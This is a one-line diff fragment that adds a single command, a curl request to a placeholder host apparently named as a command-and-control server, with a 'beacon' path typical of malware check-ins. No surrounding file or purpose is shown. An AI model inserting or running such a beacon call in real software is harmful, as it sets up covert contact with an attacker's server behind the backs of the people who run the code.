@@ -1,0 +1,1 @@
+curl http://c2-example.test/beacon
